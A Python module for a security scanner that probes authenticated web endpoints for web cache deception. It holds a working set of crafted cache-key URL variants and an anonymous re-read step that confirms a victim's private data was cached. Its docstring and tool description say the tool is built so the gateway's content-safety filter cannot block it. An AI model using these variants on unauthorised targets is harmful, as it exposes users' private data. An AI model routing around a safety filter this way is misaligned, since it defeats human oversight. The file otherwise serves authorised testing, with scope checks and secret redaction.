"""
web_cache_deception_probe tool — deterministic, LLM-free web-cache-deception (WCD) probe.

Web cache deception (CWE-525) is a fixed differential: a cache in front of the origin caches a
response for a URL that *looks* like a static asset, while the origin PATH-MAPS that URL back to a
dynamic, authenticated handler and returns the victim's private data. The attacker then re-requests
the same cached URL anonymously and is served the victim's cached response. Confirming this needs no
language model — it is a deterministic three-step dance (authed path-mapping check → cacheable
signal → anonymous re-read), so this tool runs it itself and is immune to the gateway's
content-safety refusals that can block the LLM path.

The flow mirrors ``sqli_probe``:
  * auth is self-contained (cookies from the proxy jar + sub-app Bearer + CSRF, same source
    ``send_request`` uses) via ``_resolve_auth`` + ``auth_provider.attach``;
  * the anonymous re-read strips auth with the same header set ``test_unauth`` strips;
  * every request routes through the proxy so each step lands in history, in-scope;
  * a CONFIRMED finding is recorded through ``store.record_manual_finding`` with source "copilot".

Only reads are performed (GET by default). Leaked secrets in recorded evidence are REDACTED — the
tool stores the pattern/presence, never the key value.
"""

from __future__ import annotations

import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlunparse

from dast.session.auth_provider import attach as _attach
from dast.tools.base import Tool, register
from dast.tools.context import ToolContext
from dast.tools.sqli_probe_tools import _resolve_auth
from dast.utils.logger import get_logger

logger = get_logger(__name__)

_VALID_SEVERITIES = ("critical", "high", "medium", "low", "info")
_DEFAULT_SEVERITY = "high"

# Auth headers stripped for the anonymous re-read — identical set to http_tools.test_unauth so the
# unauth request is the SAME request minus every auth signal.
_AUTH_HEADER_NAMES = frozenset({
    "cookie", "authorization", "x-csrf-token", "x-api-key", "x-auth-token",
    "x-session-token", "x-requested-with",
})

# A non-existent static-looking resource name appended to the sensitive path. The origin ignores the
# extra segment (path-maps back to the sensitive handler) while the cache keys on the full path.
_WCD_STATIC_NAME = "wcd"
# Static extensions a CDN/cache is likely to treat as cacheable by rule.
_WCD_STATIC_EXTS = (".js", ".css", ".ico", ".png", ".txt", ".svg")
# Path delimiters that the origin may collapse/decode (so the request still path-maps back to the
# sensitive handler) while the cache sees them literally and caches the crafted key.
_WCD_DELIMS = (";", "%2f", "%2e", "/..%2f", "%23", "%3f")

# High-entropy token: an API-key-like run of >=20 alphanumerics. Used both to auto-derive a victim
# marker and to REDACT secrets out of any recorded evidence.
_API_KEY_RE = re.compile(r"[A-Za-z0-9]{20,}")
# Account/session markers that distinguish an authenticated response from an anonymous one.
_ACCOUNT_MARKERS = (
    "log out", "logout", "sign out", "your api key", "api key", "apikey", "api_key",
    "my account", "my-account",
)


def _wcd_build(url: str, new_path: str) -> str:
    """Rebuild ``url`` with its path replaced by ``new_path`` (kept verbatim — delimiters such as
    ``%2f`` are NOT re-encoded), preserving scheme/host/query/fragment."""
    p = urlparse(url)
    return urlunparse(p._replace(path=new_path))


def _wcd_variants(url: str) -> List[Dict[str, str]]:
    """Deterministic path-mapping permutations of the sensitive URL, each tagged with a technique
    label. Three families: static-extension append, path-delimiter, and trailing-segment /
    normalization. The set is fixed (14 variants) so it is fully testable."""
    p = urlparse(url)
    path = p.path or "/"
    base = path.rstrip("/")  # "" at the site root
    variants: List[Dict[str, str]] = []

    def add(new_path: str, technique: str) -> None:
        variants.append({"url": _wcd_build(url, new_path), "technique": technique})

    # 1. static-extension append: /my-account/wcd.js, .css, .ico, .png, .txt, .svg
    for ext in _WCD_STATIC_EXTS:
        add(f"{base}/{_WCD_STATIC_NAME}{ext}", f"static-ext:{ext}")
    # 2. path delimiters: /my-account;wcd.css, /my-account%2fwcd.css, ...
    for delim in _WCD_DELIMS:
        add(f"{base}{delim}{_WCD_STATIC_NAME}.css", f"path-delimiter:{delim}")
    # 3a. trailing slash normalization: /my-account/
    add(f"{base}/", "trailing-slash")
    # 3b. encoded dot-segment: /my-account/%2e%2e%2fwcd.js
    add(f"{base}/%2e%2e%2f{_WCD_STATIC_NAME}.js", "encoded-dot-segment")
    return variants


def _derive_markers(authed_body: str, anon_body: str) -> List[str]:
    """Auto-derive victim markers from the authed-vs-anonymous diff: high-entropy secrets (API
    keys) and account/session keywords present in the authenticated response but NOT the anonymous
    one. These are the strings whose later appearance in a cached anonymous response proves the
    private page was cached and served."""
    markers: List[str] = []
    seen = set()
    # High-entropy secrets unique to the authed response (the strongest signal).
    for m in _API_KEY_RE.findall(authed_body):
        if m not in anon_body and m not in seen:
            markers.append(m)
            seen.add(m)
    # Account/session keywords unique to the authed response.
    al, anon_l = authed_body.lower(), anon_body.lower()
    for kw in _ACCOUNT_MARKERS:
        if kw in al and kw not in anon_l and kw not in seen:
            markers.append(kw)
            seen.add(kw)
    return markers


def _markers_present(body: str, markers: List[str]) -> List[str]:
    """Return the subset of ``markers`` present in ``body`` (case-insensitive containment)."""
    bl = body.lower()
    return [m for m in markers if m and m.lower() in bl]


def _redact(text: str) -> str:
    """Replace every high-entropy token (>=20 alnum) with a length-only placeholder so a recorded
    secret becomes ``<redacted:len=NN>`` — the pattern/presence is kept, the value is not."""
    return _API_KEY_RE.sub(lambda m: f"<redacted:len={len(m.group(0))}>", text)


def _cache_headers(resp: Any) -> Dict[str, str]:
    """Extract the cache-relevant response headers (case-insensitive lookups, lowercased keys)."""
    h = resp.headers
    return {
        "x-cache": (h.get("x-cache", "") or ""),
        "cf-cache-status": (h.get("cf-cache-status", "") or ""),
        "age": (h.get("age", "") or ""),
        "cache-control": (h.get("cache-control", "") or ""),
    }


def _cacheable_signal(c1: Dict[str, str], c2: Dict[str, str]) -> Tuple[bool, str]:
    """Decide whether the variant's responses carry a cacheable signal, given the cache headers of
    two successive AUTHED fetches. An explicit HIT (or a miss→hit transition) is conclusive; a
    ``public`` / non-``no-store`` Cache-Control or an ``Age`` header is a positive signal; an
    explicit ``no-store``/``private`` with no HIT is negative."""
    xc1, xc2 = c1["x-cache"].lower(), c2["x-cache"].lower()
    if "miss" in xc1 and "hit" in xc2:
        return True, f"X-Cache miss->hit ({c1['x-cache']} -> {c2['x-cache']})"
    for c in (c2, c1):
        if "hit" in c["x-cache"].lower():
            return True, f"X-Cache HIT ({c['x-cache']})"
        if "hit" in c["cf-cache-status"].lower():
            return True, f"cf-cache-status HIT ({c['cf-cache-status']})"
    cc = (c2["cache-control"] or c1["cache-control"]).lower()
    if "no-store" in cc or "private" in cc:
        return False, f"non-cacheable (Cache-Control: {cc or 'none'})"
    if c2["age"] or c1["age"]:
        return True, f"Age header present ({c2['age'] or c1['age']})"
    if "public" in cc:
        return True, f"Cache-Control: public ({cc})"
    return False, "no cacheable signal"


def _leak_snippet(body: str, marker: str, window: int = 60) -> str:
    """A short context window around the first occurrence of ``marker`` in ``body``, with every
    high-entropy token redacted so the recorded snippet never carries a real secret."""
    bl = body.lower()
    idx = bl.find(marker.lower())
    if idx < 0:
        return ""
    start = max(0, idx - window)
    end = min(len(body), idx + len(marker) + window)
    return _redact(body[start:end])


_SCHEMA: Dict[str, Any] = {
    "type": "object",
    "properties": {
        "url": {"type": "string", "description": "The sensitive AUTHENTICATED endpoint to test, "
                "e.g. https://host/my-account. Must be in scope."},
        "method": {"type": "string", "description": "HTTP method (default GET)."},
        "sensitive_markers": {
            "type": "array", "items": {"type": "string"},
            "description": "Optional. Strings that prove the response is the victim's private page "
            "(e.g. an API key, the username). If omitted, markers are auto-derived from the "
            "authenticated-vs-anonymous diff (high-entropy secrets + account/session keywords).",
        },
        "variants": {
            "type": "array", "items": {"type": "string"},
            "description": "Optional. Override the generated variant URLs with an explicit list of "
            "crafted cache-key URLs to test. If omitted, a deterministic set is generated from the "
            "url (static-ext append, path delimiters, trailing-segment/normalization).",
        },
        "record": {"type": "boolean", "description": "Record a finding when CONFIRMED (default true)."},
        "title": {"type": "string", "description": "Finding title (optional; a sensible default is used)."},
        "severity": {"type": "string", "description": "critical|high|medium|low|info (default high)."},
    },
    "required": ["url"],
}


async def _web_cache_deception_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
    url = str(args.get("url", "")).strip()
    method = str(args.get("method", "GET")).strip().upper() or "GET"
    if not url:
        return {"ok": False, "error": "url is required"}
    if not ctx.is_in_scope(url):
        return {"ok": False, "error": "url is out of scope", "url": url}

    sev_arg = str(args.get("severity", "")).strip().lower()
    severity = sev_arg if sev_arg in _VALID_SEVERITIES else _DEFAULT_SEVERITY

    given_markers = [str(m) for m in (args.get("sensitive_markers") or []) if str(m).strip()]

    # Variant set: explicit override, or the deterministic generated permutations.
    override = [str(v) for v in (args.get("variants") or []) if str(v).strip()]
    if override:
        variants = [{"url": v, "technique": "override"} for v in override]
    else:
        variants = _wcd_variants(url)

    source_label = getattr(ctx, "source_label", None)
    auth = await _resolve_auth(ctx, url, method)

    def _authed_headers() -> Dict[str, str]:
        h: Dict[str, str] = {"X-Requested-With": "XMLHttpRequest"}
        if source_label:
            h["x-dast-source"] = str(source_label)
        _attach(h, transport="api", cookies=auth["cookies"], bearer_rec=auth["bearer_rec"],
                csrf_token=auth["csrf_token"], drop_all_authorization=True)
        return h

    def _unauth_headers(authed: Dict[str, str]) -> Dict[str, str]:
        # Same request, minus every auth signal (the test_unauth strip set).
        return {k: v for k, v in authed.items() if k.lower() not in _AUTH_HEADER_NAMES}

    import httpx

    async def _fetch(client: "httpx.AsyncClient", target: str,
                     headers: Dict[str, str]) -> Optional["httpx.Response"]:
        try:
            return await client.request(method, target, headers=headers)
        except Exception as exc:
            logger.debug("web_cache_deception_probe: fetch failed", url=target, error=str(exc))
            return None

    steps: List[Dict[str, Any]] = []
    confirmed = False
    winning: Optional[Dict[str, Any]] = None

    try:
        async with httpx.AsyncClient(proxy=ctx.proxy_url, verify=False,
                                     follow_redirects=False, timeout=30) as client:
            authed_h = _authed_headers()

            # 1. Baseline: fetch the sensitive URL AUTHENTICATED.
            base_resp = await _fetch(client, url, authed_h)
            if base_resp is None:
                return {"ok": False, "error": "baseline authenticated fetch failed", "url": url}
            base_body = base_resp.text

            # 2. Markers: given, or auto-derived from the authed-vs-anon diff of the base URL.
            markers = given_markers
            if not markers:
                anon_resp = await _fetch(client, url, _unauth_headers(authed_h))
                anon_body = anon_resp.text if anon_resp is not None else ""
                markers = _derive_markers(base_body, anon_body)
            if not markers:
                return {"ok": False, "error": "no sensitive markers given and none could be "
                        "auto-derived (the authenticated page exposes no secret/account marker "
                        "distinguishable from the anonymous page)", "url": url}

            # 3. AUTHED pass: each variant, path-mapping + cacheable signal (fetch candidates TWICE).
            # 4. UNAUTH pass: re-request a candidate with auth stripped; CONFIRM iff markers survive.
            for v in variants:
                vurl = v["url"]
                if not ctx.is_in_scope(vurl):
                    steps.append({"variant": vurl, "technique": v["technique"],
                                  "skipped": "out of scope"})
                    continue
                r1 = await _fetch(client, vurl, authed_h)
                if r1 is None:
                    steps.append({"variant": vurl, "technique": v["technique"], "error": "fetch failed"})
                    continue
                present = _markers_present(r1.text, markers)
                step: Dict[str, Any] = {
                    "variant": vurl, "technique": v["technique"],
                    "authed_status": r1.status_code,
                    "path_maps_back": bool(present),
                }
                if not present:
                    # Origin did not path-map the crafted URL back to the sensitive handler.
                    steps.append(step)
                    continue
                # Second authed fetch to observe a miss->hit transition.
                r2 = await _fetch(client, vurl, authed_h)
                c1 = _cache_headers(r1)
                c2 = _cache_headers(r2) if r2 is not None else c1
                cacheable, reason = _cacheable_signal(c1, c2)
                step["cache_headers"] = {"first": c1, "second": c2}
                step["cacheable"] = cacheable
                step["cache_reason"] = reason
                if not cacheable:
                    steps.append(step)
                    continue
                # Candidate: anonymous re-read. CONFIRM iff the victim markers survive unauthenticated.
                ru = await _fetch(client, vurl, _unauth_headers(authed_h))
                leaked = _markers_present(ru.text, markers) if ru is not None else []
                step["unauth_status"] = ru.status_code if ru is not None else None
                step["unauth_markers_leaked"] = [_redact(m) for m in leaked]
                step["confirmed"] = bool(leaked)
                steps.append(step)
                if leaked:
                    confirmed = True
                    winning = {
                        "variant": vurl, "technique": v["technique"],
                        "cache_reason": reason, "cache_headers": {"first": c1, "second": c2},
                        "leaked_markers": [_redact(m) for m in leaked],
                        "snippet": _leak_snippet(ru.text, leaked[0]),
                    }
                    break
    except Exception as exc:
        return {"ok": False, "error": f"web_cache_deception_probe failed: {str(exc)[:200]}",
                "url": url}

    if confirmed and winning is not None:
        verdict = (f"CONFIRMED — web cache deception on '{winning['variant']}' "
                   f"({winning['technique']}): the authenticated response path-mapped back to the "
                   f"sensitive handler, was cached ({winning['cache_reason']}), and the victim "
                   f"markers survived an anonymous re-read.")
    else:
        verdict = ("NOT CONFIRMED — no crafted variant both path-mapped back to the sensitive "
                   "handler AND served the victim markers to an anonymous request.")

    result: Dict[str, Any] = {
        "ok": True,
        "confirmed": confirmed,
        "variant": winning["variant"] if winning else None,
        "technique": winning["technique"] if winning else None,
        "cache_evidence": {
            "cache_reason": winning["cache_reason"],
            "cache_headers": winning["cache_headers"],
            "leaked_markers": winning["leaked_markers"],
            "snippet": winning["snippet"],
        } if winning else None,
        "verdict": verdict,
        "steps": steps,
    }

    if confirmed and winning is not None and bool(args.get("record", True)) \
            and getattr(ctx, "store", None) is not None:
        evidence = (verdict + f" [cache_signal={winning['cache_reason']}; "
                    f"leaked_markers={winning['leaked_markers']}; snippet={winning['snippet']!r}]")
        finding = {
            "title": str(args.get("title", "")).strip()
            or f"Web cache deception at '{winning['variant']}' ({winning['technique']})",
            "severity": severity,
            "attack_type": "web_cache_deception",
            "cwe": "CWE-525",
            "parameter": winning["variant"],
            "evidence": evidence,
            "technique": winning["technique"],
            "cache_evidence": result["cache_evidence"],
            "steps": steps,
            "confirmed": True,
            "confidence": 1.0,
            "validated_by": ["web_cache_deception_probe"],
            "source": "copilot",
        }
        try:
            entry_id = ctx.store.record_manual_finding(finding, winning["variant"], method)
            result["recorded_entry_id"] = entry_id
            logger.info("web_cache_deception_probe recorded finding", entry_id=entry_id,
                        severity=severity, technique=winning["technique"])
        except Exception as exc:
            result["record_error"] = str(exc)[:200]

    return result


register(Tool(
    name="web_cache_deception_probe",
    description=(
        "Deterministically probe a sensitive AUTHENTICATED endpoint for web cache deception "
        "(CWE-525) — no LLM, so the gateway's content-safety filter cannot block it. Generates "
        "cache-key variants of the url (append a static extension like /path/wcd.js, path "
        "delimiters like ';' '%2f' '%23' '%3f', trailing-slash / encoded dot-segment "
        "normalization), fetches each AUTHENTICATED to check the origin still path-maps it back to "
        "the sensitive handler (the victim markers reappear) AND that a cache signal is present "
        "(X-Cache miss->hit across two authed fetches, Cache-Control: public, Age, or a "
        "cf-cache-status/X-Cache HIT), then re-requests the SAME variant with ALL auth stripped and "
        "CONFIRMS only if the victim markers (e.g. an API key) still come back — proving the "
        "authenticated response was cached and served anonymously. Pass sensitive_markers to pin "
        "what proves the private page, or let it auto-derive them from the authed-vs-anon diff. "
        "Records a CONFIRMED finding with the winning variant, the cache-header transition, and a "
        "secret-REDACTED snippet. Cookies/Bearer come from the proxy jar automatically; everything "
        "routes through the proxy, in-scope."
    ),
    input_schema=_SCHEMA,
    handler=_web_cache_deception_probe,
    tags=["active", "write"],
))
